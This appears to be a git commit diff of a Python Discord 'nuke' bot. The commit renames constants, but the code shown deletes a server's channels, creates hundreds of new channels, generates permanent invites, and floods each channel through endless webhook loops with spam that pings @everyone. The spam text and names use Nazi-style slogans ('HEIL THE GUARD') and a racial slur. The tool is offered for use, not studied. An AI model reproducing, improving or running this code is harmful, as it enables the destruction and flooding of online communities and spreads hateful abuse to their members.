a63d67ff600fd3d60a632cfccbc101a1db9b523c
hmgJak <130262196+hmgJak@users.noreply.github.com>
2023-04-09 06:24:43 -0400

    Update cute.py

--- cute.py
+++ cute.py
@@ -6,8 +6,8 @@ from colorama import Fore, Back, Style, init
 init()
 
 TOKEN = input("token:")
-channel = "heil-hmg"
-spam = ["""
+CHANNEL = "heil-hmg"
+SPAM = ["""
 ```Nuked By His Majesty's Guard [ĦМ₲]```
 
 __**HEIL THE GUARD**__
@@ -15,7 +15,7 @@ https://media.discordapp.net/attachments/1091794018301661355/1091794133120720966
 https://discord.gg/rdXHweYQ7f
 ||@everyone||
 """]
-webhook2 = "NIGGERED BY THE GUARD"
+WEBHOOKT = "NIGGERED BY THE GUARD"
 
 intents = discord.Intents.all()
 client = commands.Bot(command_prefix = ">", intents=intents)
@@ -42,21 +42,21 @@ async def nuke(ctx):
         except:
             print("DELETING CHANNELS: FAILED")
     for _i in range(125):
-        await ctx.guild.create_text_channel(name=random.choice(channel))
+        await ctx.guild.create_text_channel(name=random.choice(CHANNEL))
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invitation: {link}")
     amount = 500
     for i in range(amount):
-     await ctx.guild.create_text_channel(name=random.choice(channel))
+     await ctx.guild.create_text_channel(name=random.choice(CHANNEL))
     return
 
 @client.event
 async def on_guild_channel_create(channel):
-  webhook = await channel.create_webhook(name=random.choice(webhook2))
+  webhook = await channel.create_webhook(name=random.choice(WEBHOOKT))
   while True:
-    await channel.send(random.choice(spam))
-    await webhook.send(random.choice(spam),
-                           username=random.choice(webhook2))  
+    await channel.send(random.choice(SPAM))
+    await webhook.send(random.choice(SPAM),
+                           username=random.choice(WEBHOOKT))  
 
 client.run(TOKEN)
